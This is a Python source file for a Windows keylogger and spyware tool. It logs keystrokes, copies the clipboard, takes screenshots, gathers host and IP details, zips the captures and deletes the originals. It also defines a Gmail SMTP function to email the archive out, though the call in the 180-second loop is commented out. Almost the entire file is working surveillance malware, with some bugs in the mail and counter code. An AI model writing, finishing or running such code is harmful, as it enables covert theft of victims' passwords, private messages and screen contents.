import wave
import os
import zipfile
from typing import Union, Any
import numpy
import pynput
import sounddevice
from numpy import ndarray
from pynput.keyboard import Key, Listener
import socket
import platform
import requests
import win32clipboard
import os
from threading import Timer
from multiprocessing import Process, freeze_support
from PIL import ImageGrab, Image
from zipfile import ZipFile
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.header import Header
import time

# Changing Dir and creating needed files

os.chdir("C:\\")

if not os.path.exists("Sys Log"):
    os.mkdir("Sys Log")
else:
    pass

os.chdir("C:\Sys Log")

system_information = open("sys_info.txt", "w")
system_information.close()

clipboard_information = open("clipboard.txt", "w")
clipboard_information.close()

keys_information = open("log.txt", "w")
keys_information.close()

# KeyLogger

count = 0
keys = []
def key_logger():
    def on_press(key):
        global keys, count

        keys.append(key)
        count += 200
        print("{0} is pressed".format(key))

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open("log.txt", "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                elif k.find("enter") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


# Target Info

def get_target_info():
    hostname = socket.gethostname()
    priv_ip = socket.gethostbyname(hostname)
    pub_ip = requests.get("https://api.ipify.org").text
    processor = platform.processor()
    system = platform.system()
    sys_version = platform.version()
    machine_info = platform.machine()

    with open("sys_info.txt", "w") as sys_file:
        sys_file.write("Hostname: " + hostname + "\n")
        sys_file.write("Private ip: " + priv_ip + "\n")
        sys_file.write("Public ip: " + pub_ip + "\n")
        sys_file.write("Processor: " + processor + "\n")
        sys_file.write("OS: " + system + "\n")
        sys_file.write("OS Version: " + sys_version + "\n")
        sys_file.write("Machine info: " + machine_info + "\n")


# Copy Clipboard

def copy_clipboard():
    with open("clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(data)
        except:
            f.write("Clipboard cannot be copied \n")


# Screenshot

def take_screenshot():
    im = ImageGrab.grab()
    im.save('screenshot.png')


# Zip Files and delete

def zip_files():
    files = os.listdir('C:\Sys Log')
    with zipfile.ZipFile('final.zip', 'w') as zipF:
        for file in files:
            zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
            os.remove(file)


# Send mail

gmail_pass = "<your app password here>"
user = "<your gmail here>"
host = "smtp.gmail.com"
port = 465
filename='final.zip'

def send_mail(to,body,filename):
    message = MIMEMultipart()

    message['From'] = Header(user)
    message['To'] = Header(to)
    body_part = MIMEText(body,'plain')

    message.attach(body)
    with open(filename,'rb') as f:
        message.attach(MIMEApplication(f.read(),name=filename))

    smtp_obj = smtplib.SMTP(host,port)
    smtp_obj.login(user,gmail_pass)

    smtp_obj.sendmail( message['From'],message['To'], message.as_string())
    smtp_obj.quit()



# Execute every 180s

while(True):
    take_screenshot()
    key_logger()
    copy_clipboard()
    get_target_info()
    zip_files()
    #send_mail()
    time.sleep(180)

